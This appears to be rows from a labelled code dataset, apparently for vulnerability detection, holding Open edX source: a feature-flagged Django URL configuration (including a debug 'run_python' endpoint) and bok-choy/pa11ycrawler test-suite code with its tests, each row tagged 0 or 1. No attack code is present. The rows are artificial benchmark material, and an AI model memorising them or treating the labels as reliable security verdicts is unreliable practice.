        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',
            'course_groups.views.add_cohort',
            name=""add_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',
            'course_groups.views.users_in_cohort',
            name=""list_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',
            'course_groups.views.add_users_to_cohort',
            name=""add_to_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',
            'course_groups.views.remove_user_from_cohort',
            name=""remove_from_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',
            'course_groups.views.debug_cohort_mgmt',
            name=""debug_cohort_mgmt""),

        # Open Ended Notifications
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',
            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',
            'open_ended_grading.views.peer_grading', name='peer_grading'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),

    )

    # allow course staff to change to student view of courseware
    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):
        urlpatterns += (
            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=""masquerade-switch""),
        )

    # discussion forums live within courseware, so courseware must be enabled first
    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',
                'courseware.views.news', name=""news""),
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',
                include('django_comment_client.urls'))
        )
    urlpatterns += (
        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',
        'courseware.views.static_tab', name=""static_tab""),
    )

    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',
                'courseware.views.submission_history',
                name='submission_history'),
        )


if settings.ENABLE_JASMINE:
    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)

if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    ## Jasmine and admin
    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)

if settings.MITX_FEATURES.get('AUTH_USE_OPENID'):
    urlpatterns += (
        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),
        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),
        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),
    )

if settings.MITX_FEATURES.get('AUTH_USE_SHIB'):
    urlpatterns += (
        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),
    )

if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):
    urlpatterns += (
        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_login', name='course-specific-login'),
        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_register', name='course-specific-register'),

    )


if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):
    urlpatterns += (
        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),
        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),
        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),
        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')
    )

if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):
    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),

if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):
    urlpatterns += (
        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),
        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),
    )

if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):
    urlpatterns += (
        url(r'^event_logs$', 'track.views.view_tracking_log'),
        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),
    )

if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):
    urlpatterns += (
        url(r'^status/', include('service_status.urls')),
    )

if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):
    urlpatterns += (
        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),
    )

if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):
    urlpatterns += (
        url(r'^edinsights_service/', include('edinsights.core.urls')),
    )
    import edinsights.core.registry

# FoldIt views
urlpatterns += (
    # The path is hardcoded into their app...
    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=""foldit_ops""),
)

if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):
    urlpatterns += (
        url(r'^debug/run_python', 'debug.views.run_python'),
    )

# Crowdsourced hinting instructor manager.
if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',
            'instructor.hint_manager.hint_manager', name=""hint_manager""),
    )

urlpatterns = patterns(*urlpatterns)

if settings.DEBUG:
    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)

#Custom error pages
handler404 = 'static_template_view.views.render_404'
handler500 = 'static_template_view.views.render_500'
/n/n/n",1
42,1162dbc18fda91b07a5942873387d60fd67b2cfc,"pavelib/paver_tests/test_paver_bok_choy_cmds.py/n/n""""""
Tests for the bok-choy paver commands themselves.
Run just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py
""""""
import os
import unittest

from mock import patch, call
from test.test_support import EnvironmentVarGuard
from paver.easy import BuildFailure
from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler

REPO_DIR = os.getcwd()


class TestPaverBokChoyCmd(unittest.TestCase):
    """"""
    Paver Bok Choy Command test cases
    """"""

    def _expected_command(self, name, store=None, verify_xss=True):
        """"""
        Returns the command that is expected to be run for the given test spec
        and store.
        """"""

        expected_statement = (
            ""DEFAULT_STORE={default_store} ""
            ""SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' ""
            ""BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' ""
            ""BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' ""
            ""SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' ""
            ""VERIFY_XSS='{verify_xss}' ""
            ""nosetests {repo_dir}/common/test/acceptance/{exp_text} ""
            ""--with-xunit ""
            ""--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml ""
            ""--verbosity=2 ""
        ).format(
            default_store=store,
            repo_dir=REPO_DIR,
            shard_str='/shard_' + self.shard if self.shard else '',
            exp_text=name,
            a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js',
            verify_xss=verify_xss
        )
        return expected_statement

    def setUp(self):
        super(TestPaverBokChoyCmd, self).setUp()
        self.shard = os.environ.get('SHARD')
        self.env_var_override = EnvironmentVarGuard()

    def test_default(self):
        suite = BokChoyTestSuite('')
        name = 'tests'
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_suite_spec(self):
        spec = 'test_foo.py'
        suite = BokChoyTestSuite('', test_spec=spec)
        name = 'tests/{}'.format(spec)
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_class_spec(self):
        spec = 'test_foo.py:FooTest'
        suite = BokChoyTestSuite('', test_spec=spec)
        name = 'tests/{}'.format(spec)
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_testcase_spec(self):
        spec = 'test_foo.py:FooTest.test_bar'
        suite = BokChoyTestSuite('', test_spec=spec)
        name = 'tests/{}'.format(spec)
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_spec_with_draft_default_store(self):
        spec = 'test_foo.py'
        suite = BokChoyTestSuite('', test_spec=spec, default_store='draft')
        name = 'tests/{}'.format(spec)
        self.assertEqual(
            suite.cmd,
            self._expected_command(name=name, store='draft')
        )

    def test_invalid_default_store(self):
        # the cmd will dumbly compose whatever we pass in for the default_store
        suite = BokChoyTestSuite('', default_store='invalid')
        name = 'tests'
        self.assertEqual(
            suite.cmd,
            self._expected_command(name=name, store='invalid')
        )

    def test_serversonly(self):
        suite = BokChoyTestSuite('', serversonly=True)
        self.assertEqual(suite.cmd, """")

    def test_verify_xss(self):
        suite = BokChoyTestSuite('', verify_xss=True)
        name = 'tests'
        self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))

    def test_verify_xss_env_var(self):
        self.env_var_override.set('VERIFY_XSS', 'False')
        with self.env_var_override:
            suite = BokChoyTestSuite('')
            name = 'tests'
            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=False))

    def test_test_dir(self):
        test_dir = 'foo'
        suite = BokChoyTestSuite('', test_dir=test_dir)
        self.assertEqual(
            suite.cmd,
            self._expected_command(name=test_dir)
        )

    def test_verbosity_settings_1_process(self):
        """"""
        Using 1 process means paver should ask for the traditional xunit plugin for plugin results
        """"""
        expected_verbosity_string = (
            ""--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2"".format(
                repo_dir=REPO_DIR,
                shard_str='/shard_' + self.shard if self.shard else ''
            )
        )
        suite = BokChoyTestSuite('', num_processes=1)
        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)

    def test_verbosity_settings_2_processes(self):
        """"""
        Using multiple processes means specific xunit, coloring, and process-related settings should
        be used.
        """"""
        process_count = 2
        expected_verbosity_string = (
            ""--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml""
            "" --processes={procs} --no-color --process-timeout=1200"".format(
                repo_dir=REPO_DIR,
                shard_str='/shard_' + self.shard if self.shard else '',
                procs=process_count
            )
        )
        suite = BokChoyTestSuite('', num_processes=process_count)
        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)

    def test_verbosity_settings_3_processes(self):
        """"""
        With the above test, validate that num_processes can be set to various values
        """"""
        process_count = 3
        expected_verbosity_string = (
            ""--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml""
            "" --processes={procs} --no-color --process-timeout=1200"".format(
                repo_dir=REPO_DIR,
                shard_str='/shard_' + self.shard if self.shard else '',
                procs=process_count
            )
        )
        suite = BokChoyTestSuite('', num_processes=process_count)
        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)

    def test_invalid_verbosity_and_processes(self):
        """"""
        If an invalid combination of verbosity and number of processors is passed in, a
        BuildFailure should be raised
        """"""
        suite = BokChoyTestSuite('', num_processes=2, verbosity=3)
        with self.assertRaises(BuildFailure):
            BokChoyTestSuite.verbosity_processes_string(suite)


class TestPaverPa11yCrawlerCmd(unittest.TestCase):

    """"""
    Paver pa11ycrawler command test cases.  Most of the functionality is
    inherited from BokChoyTestSuite, so those tests aren't duplicated.
    """"""

    def setUp(self):
        super(TestPaverPa11yCrawlerCmd, self).setUp()

        # Mock shell commands
        mock_sh = patch('pavelib.utils.test.suites.bokchoy_suite.sh')
        self._mock_sh = mock_sh.start()

        # Cleanup mocks
        self.addCleanup(mock_sh.stop)

    def _expected_command(self, report_dir, start_urls):
        """"""
        Returns the expected command to run pa11ycrawler.
        """"""
        expected_statement = (
            'pa11ycrawler run {start_urls} '
            '--pa11ycrawler-allowed-domains=localhost '
            '--pa11ycrawler-reports-dir={report_dir} '
            '--pa11ycrawler-deny-url-matcher=logout '
            '--pa11y-reporter=""1.0-json"" '
            '--depth-limit=6 '
        ).format(
            start_urls=' '.join(start_urls),
            report_dir=report_dir,
        )
        return expected_statement

    def test_default(self):
        suite = Pa11yCrawler('')
        self.assertEqual(
            suite.cmd,
            self._expected_command(suite.pa11y_report_dir, suite.start_urls)
        )

    def test_get_test_course(self):
        suite = Pa11yCrawler('')
        suite.get_test_course()
        self._mock_sh.assert_has_calls([
            call(
                'wget {targz} -O {dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)),
            call(
                'tar zxf {dir}demo_course.tar.gz -C {dir}'.format(dir=suite.imports_dir)),
        ])

    def test_generate_html_reports(self):
        suite = Pa11yCrawler('')
        suite.generate_html_reports()
        self._mock_sh.assert_has_calls([
            call(
                'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={}'.format(suite.pa11y_report_dir)),
        ])
/n/n/npavelib/utils/test/suites/bokchoy_suite.py/n/n""""""
Class used for defining and running Bok Choy acceptance test suite
""""""
from time import sleep
from urllib import urlencode

from common.test.acceptance.fixtures.course import CourseFixture, FixtureError

from path import Path as path
from paver.easy import sh, BuildFailure
from pavelib.utils.test.suites.suite import TestSuite
from pavelib.utils.envs import Env
from pavelib.utils.test import bokchoy_utils
from pavelib.utils.test import utils as test_utils

import os

try:
    from pygments.console import colorize
except ImportError:
    colorize = lambda color, text: text

__test__ = False  # do not collect

DEFAULT_NUM_PROCESSES = 1
DEFAULT_VERBOSITY = 2


class BokChoyTestSuite(TestSuite):
    """"""
    TestSuite for running Bok Choy tests
    Properties (below is a subset):
      test_dir - parent directory for tests
      log_dir - directory for test output
      report_dir - directory for reports (e.g., coverage) related to test execution
      xunit_report - directory for xunit-style output (xml)
      fasttest - when set, skip various set-up tasks (e.g., collectstatic)
      serversonly - prepare and run the necessary servers, only stopping when interrupted with Ctrl-C
      testsonly - assume servers are running (as per above) and run tests with no setup or cleaning of environment
      test_spec - when set, specifies test files, classes, cases, etc. See platform doc.
      default_store - modulestore to use when running tests (split or draft)
      num_processes - number of processes or threads to use in tests. Recommendation is that this
      is less than or equal to the number of available processors.
      verify_xss - when set, check for XSS vulnerabilities in the page HTML.
      See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html
    """"""
    def __init__(self, *args, **kwargs):
        super(BokChoyTestSuite, self).__init__(*args, **kwargs)
        self.test_dir = Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests')
        self.log_dir = Env.BOK_CHOY_LOG_DIR
        self.report_dir = kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR)
        self.xunit_report = self.report_dir / ""xunit.xml""
        self.cache = Env.BOK_CHOY_CACHE
        self.fasttest = kwargs.get('fasttest', False)
        self.serversonly = kwargs.get('serversonly', False)
        self.testsonly = kwargs.get('testsonly', False)
        self.test_spec = kwargs.get('test_spec', None)
        self.default_store = kwargs.get('default_store', None)
        self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)
        self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)
        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', True))
        self.extra_args = kwargs.get('extra_args', '')
        self.har_dir = self.log_dir / 'hars'
        self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE
        self.imports_dir = kwargs.get('imports_dir', None)
        self.coveragerc = kwargs.get('coveragerc', None)
        self.save_screenshots = kwargs.get('save_screenshots', False)

    def __enter__(self):
        super(BokChoyTestSuite, self).__enter__()

        # Ensure that we have a directory to put logs and reports
        self.log_dir.makedirs_p()
        self.har_dir.makedirs_p()
        self.report_dir.makedirs_p()
        test_utils.clean_reports_dir()      # pylint: disable=no-value-for-parameter

        if not (self.fasttest or self.skip_clean or self.testsonly):
            test_utils.clean_test_files()

        msg = colorize('green', ""Checking for mongo, memchache, and mysql..."")
        print msg
        bokchoy_utils.check_services()

        if not self.testsonly:
            self.prepare_bokchoy_run()
        else:
            # load data in db_fixtures
            self.load_data()

        msg = colorize('green', ""Confirming servers have started..."")
        print msg
        bokchoy_utils.wait_for_test_servers()
        try:
            # Create course in order to seed forum data underneath. This is
            # a workaround for a race condition. The first time a course is created;
            # role permissions are set up for forums.
            CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install()
            print 'Forums permissions/roles data has been seeded'
        except FixtureError:
            # this means it's already been done
            pass

        if self.serversonly:
            self.run_servers_continuously()

    def __exit__(self, exc_type, exc_value, traceback):
        super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback)

        # Using testsonly will leave all fixtures in place (Note: the db will also be dirtier.)
        if self.testsonly:
            msg = colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.')
            print msg
        else:
            # Clean up data we created in the databases
            msg = colorize('green', ""Cleaning up databases..."")
            print msg
            sh(""./manage.py lms --settings bok_choy flush --traceback --noinput"")
            bokchoy_utils.clear_mongo()

    def verbosity_processes_string(self):
        """"""
        Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct
        the proper combination for use with nosetests.
        """"""
        substring = []

        if self.verbosity != DEFAULT_VERBOSITY and self.num_processes != DEFAULT_NUM_PROCESSES:
            msg = 'Cannot pass in both num_processors and verbosity. Quitting'
            raise BuildFailure(msg)

        if self.num_processes != 1:
            # Construct ""multiprocess"" nosetest substring
            substring = [
                ""--with-xunitmp --xunitmp-file={}"".format(self.xunit_report),
                ""--processes={}"".format(self.num_processes),
                ""--no-color --process-timeout=1200""
            ]

        else:
            substring = [
                ""--with-xunit"",
                ""--xunit-file={}"".format(self.xunit_report),
                ""--verbosity={}"".format(self.verbosity),
            ]

        return "" "".join(substring)

    def prepare_bokchoy_run(self):
        """"""
        Sets up and starts servers for a Bok Choy run. If --fasttest is not
        specified then static assets are collected
        """"""
        sh(""{}/scripts/reset-test-db.sh"".format(Env.REPO_ROOT))

        if not self.fasttest:
            self.generate_optimized_static_assets()

        # Clear any test data already in Mongo or MySQLand invalidate
        # the cache
        bokchoy_utils.clear_mongo()
        self.cache.flush_all()

        # load data in db_fixtures
        self.load_data()

        # load courses if self.imports_dir is set
        self.load_courses()

        # Ensure the test servers are available
        msg = colorize('green', ""Confirming servers are running..."")
        print msg
        bokchoy_utils.start_servers(self.default_store, self.coveragerc)

    def load_courses(self):
        """"""
        Loads courses from self.imports_dir.

        Note: self.imports_dir is the directory that contains the directories
        that have courses in them. For example, if the course is located in
        `test_root/courses/test-example-course/`, self.imports_dir should be
        `test_root/courses/`.
        """"""
        msg = colorize('green', ""Importing courses from {}..."".format(self.imports_dir))
        print msg

        if self.imports_dir:
            sh(
                ""DEFAULT_STORE={default_store}""
                "" ./manage.py cms --settings=bok_choy import {import_dir}"".format(
                    default_store=self.default_store,
                    import_dir=self.imports_dir
                )
            )

    def load_data(self):
        """"""
        Loads data into database from db_fixtures
        """"""
        print 'Loading data from json fixtures in db_fixtures directory'
        sh(
            ""DEFAULT_STORE={default_store}""
            "" ./manage.py lms --settings bok_choy loaddata --traceback""
            "" common/test/db_fixtures/*.json"".format(
                default_store=self.default_store,
            )
        )

    def run_servers_continuously(self):
        """"""
        Infinite loop. Servers will continue to run in the current session unless interrupted.
        """"""
        print 'Bok-choy servers running. Press Ctrl-C to exit...\n'
        print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\n'

        while True:
            try:
                sleep(10000)
            except KeyboardInterrupt:
                print ""Stopping bok-choy servers.\n""
                break

    @property
    def cmd(self):
        """"""
        This method composes the nosetests command to send to the terminal. If nosetests aren't being run,
         the command returns an empty string.
        """"""
        # Default to running all tests if no specific test is specified
        if not self.test_spec:
            test_spec = self.test_dir
        else:
            test_spec = self.test_dir / self.test_spec

        # Skip any additional commands (such as nosetests) if running in
        # servers only mode
        if self.serversonly:
            return """"

        # Construct the nosetests command, specifying where to save
        # screenshots and XUnit XML reports
        cmd = [
            ""DEFAULT_STORE={}"".format(self.default_store),
            ""SCREENSHOT_DIR='{}'"".format(self.log_dir),
            ""BOK_CHOY_HAR_DIR='{}'"".format(self.har_dir),
            ""BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'"".format(self.a11y_file),
            ""SELENIUM_DRIVER_LOG_DIR='{}'"".format(self.log_dir),
            ""VERIFY_XSS='{}'"".format(self.verify_xss),
            ""nosetests"",
            test_spec,
            ""{}"".format(self.verbosity_processes_string())
        ]
        if self.pdb:
            cmd.append(""--pdb"")
        if self.save_screenshots:
            cmd.append(""--with-save-baseline"")
        cmd.append(self.extra_args)

        cmd = ("" "").join(cmd)
        return cmd


class Pa11yCrawler(BokChoyTestSuite):
    """"""
    Sets up test environment with mega-course loaded, and runs pa11ycralwer
    against it.
    """"""

    def __init__(self, *args, **kwargs):
        super(Pa11yCrawler, self).__init__(*args, **kwargs)
        self.course_key = kwargs.get('course_key')
        if self.imports_dir:
            # If imports_dir has been specified, assume the files are
            # already there -- no need to fetch them from github. This
            # allows someome to crawl a different course. They are responsible
            # for putting it, un-archived, in the directory.
            self.should_fetch_course = False
        else:
            # Otherwise, obey `--skip-fetch` command and use the default
            # test course.  Note that the fetch will also be skipped when
            # using `--fast`.
            self.should_fetch_course = kwargs.get('should_fetch_course')
            self.imports_dir = path('test_root/courses/')

        self.pa11y_report_dir = os.path.join(self.report_dir, 'pa11ycrawler_reports')
        self.tar_gz_file = ""https://github.com/edx/demo-test-course/archive/master.tar.gz""

        self.start_urls = []
        auto_auth_params = {
            ""redirect"": 'true',
            ""staff"": 'true',
            ""course_id"": self.course_key,
        }
        cms_params = urlencode(auto_auth_params)
        self.start_urls.append(""\""http://localhost:8031/auto_auth?{}\"""".format(cms_params))

        sequence_url = ""/api/courses/v1/blocks/?{}"".format(
            urlencode({
                ""course_id"": self.course_key,
                ""depth"": ""all"",
                ""all_blocks"": ""true"",
            })
        )
        auto_auth_params.update({'redirect_to': sequence_url})
        lms_params = urlencode(auto_auth_params)
        self.start_urls.append(""\""http://localhost:8003/auto_auth?{}\"""".format(lms_params))

    def __enter__(self):
        if self.should_fetch_course:
            self.get_test_course()
        super(Pa11yCrawler, self).__enter__()

    def get_test_course(self):
        """"""
        Fetches the test course.
        """"""
        self.imports_dir.makedirs_p()
        zipped_course = self.imports_dir + 'demo_course.tar.gz'

        msg = colorize('green', ""Fetching the test course from github..."")
        print msg

        sh(
            'wget {tar_gz_file} -O {zipped_course}'.format(
                tar_gz_file=self.tar_gz_file,
                zipped_course=zipped_course,
            )
        )

        msg = colorize('green', ""Uncompressing the test course..."")
        print msg

        sh(
            'tar zxf {zipped_course} -C {courses_dir}'.format(
                zipped_course=zipped_course,
                courses_dir=self.imports_dir,
            )
        )

    def generate_html_reports(self):
        """"""
        Runs pa11ycrawler json-to-html
        """"""
        cmd_str = (
            'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}'
        ).format(report_dir=self.pa11y_report_dir)

        sh(cmd_str)

    @property
    def cmd(self):
        """"""
        Runs pa11ycrawler as staff user against the test course.
        """"""
        cmd_str = (
            'pa11ycrawler run {start_urls} '
            '--pa11ycrawler-allowed-domains={allowed_domains} '
            '--pa11ycrawler-reports-dir={report_dir} '
            '--pa11ycrawler-deny-url-matcher={dont_go_here} '
            '--pa11y-reporter=""{reporter}"" '
            '--depth-limit={depth} '
        ).format(
            start_urls=' '.join(self.start_urls),
            allowed_domains='localhost',
            report_dir=self.pa11y_report_dir,
            reporter=""1.0-json"",
            dont_go_here=""logout"",
            depth=""6"",
        )
        return cmd_str
/n/n/n",0
43,1162dbc18fda91b07a5942873387d60fd67b2cfc,"/pavelib/paver_tests/test_paver_bok_choy_cmds.py/n/n""""""
Tests for the bok-choy paver commands themselves.
Run just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py
""""""
import os
import unittest

from mock import patch, call
from test.test_support import EnvironmentVarGuard
from paver.easy import BuildFailure
from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler

REPO_DIR = os.getcwd()


class TestPaverBokChoyCmd(unittest.TestCase):
    """"""
    Paver Bok Choy Command test cases
    """"""

    def _expected_command(self, name, store=None, verify_xss=False):
        """"""
        Returns the command that is expected to be run for the given test spec
        and store.
        """"""

        expected_statement = (
            ""DEFAULT_STORE={default_store} ""
            ""SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' ""
            ""BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' ""
            ""BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' ""
            ""SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' ""
            ""VERIFY_XSS='{verify_xss}' ""
            ""nosetests {repo_dir}/common/test/acceptance/{exp_text} ""
            ""--with-xunit ""
            ""--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml ""
            ""--verbosity=2 ""
        ).format(
            default_store=store,
            repo_dir=REPO_DIR,
            shard_str='/shard_' + self.shard if self.shard else '',
            exp_text=name,
            a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js',
            verify_xss=verify_xss
        )
        return expected_statement

    def setUp(self):
        super(TestPaverBokChoyCmd, self).setUp()
        self.shard = os.environ.get('SHARD')
        self.env_var_override = EnvironmentVarGuard()

    def test_default(self):
        suite = BokChoyTestSuite('')
        name = 'tests'
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_suite_spec(self):
        spec = 'test_foo.py'
        suite = BokChoyTestSuite('', test_spec=spec)
        name = 'tests/{}'.format(spec)
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_class_spec(self):
        spec = 'test_foo.py:FooTest'
        suite = BokChoyTestSuite('', test_spec=spec)
        name = 'tests/{}'.format(spec)
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_testcase_spec(self):
        spec = 'test_foo.py:FooTest.test_bar'
        suite = BokChoyTestSuite('', test_spec=spec)
        name = 'tests/{}'.format(spec)
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_spec_with_draft_default_store(self):
        spec = 'test_foo.py'
        suite = BokChoyTestSuite('', test_spec=spec, default_store='draft')
        name = 'tests/{}'.format(spec)
        self.assertEqual(
            suite.cmd,
            self._expected_command(name=name, store='draft')
        )

    def test_invalid_default_store(self):
        # the cmd will dumbly compose whatever we pass in for the default_store
        suite = BokChoyTestSuite('', default_store='invalid')
        name = 'tests'
        self.assertEqual(
            suite.cmd,
            self._expected_command(name=name, store='invalid')
        )

    def test_serversonly(self):
        suite = BokChoyTestSuite('', serversonly=True)
        self.assertEqual(suite.cmd, """")

    def test_verify_xss(self):
        suite = BokChoyTestSuite('', verify_xss=True)
        name = 'tests'
        self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))

    def test_verify_xss_env_var(self):
        self.env_var_override.set('VERIFY_XSS', 'True')
        with self.env_var_override:
            suite = BokChoyTestSuite('')
            name = 'tests'
            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))

    def test_test_dir(self):
        test_dir = 'foo'
        suite = BokChoyTestSuite('', test_dir=test_dir)
        self.assertEqual(
            suite.cmd,
            self._expected_command(name=test_dir)
        )

    def test_verbosity_settings_1_process(self):
        """"""
        Using 1 process means paver should ask for the traditional xunit plugin for plugin results
        """"""
        expected_verbosity_string = (
            ""--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2"".format(
                repo_dir=REPO_DIR,
                shard_str='/shard_' + self.shard if self.shard else ''
            )
        )
        suite = BokChoyTestSuite('', num_processes=1)
        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)

    def test_verbosity_settings_2_processes(self):
        """"""
        Using multiple processes means specific xunit, coloring, and process-related settings should
        be used.
        """"""
        process_count = 2
        expected_verbosity_string = (
            ""--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml""
            "" --processes={procs} --no-color --process-timeout=1200"".format(
                repo_dir=REPO_DIR,
                shard_str='/shard_' + self.shard if self.shard else '',
                procs=process_count
            )
        )
        suite = BokChoyTestSuite('', num_processes=process_count)
        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)

    def test_verbosity_settings_3_processes(self):
        """"""
        With the above test, validate that num_processes can be set to various values
        """"""
        process_count = 3
        expected_verbosity_string = (
            ""--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml""
            "" --processes={procs} --no-color --process-timeout=1200"".format(
                repo_dir=REPO_DIR,
                shard_str='/shard_' + self.shard if self.shard else '',
                procs=process_count
            )
        )
        suite = BokChoyTestSuite('', num_processes=process_count)
        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)

    def test_invalid_verbosity_and_processes(self):
        """"""
        If an invalid combination of verbosity and number of processors is passed in, a
        BuildFailure should be raised
        """"""
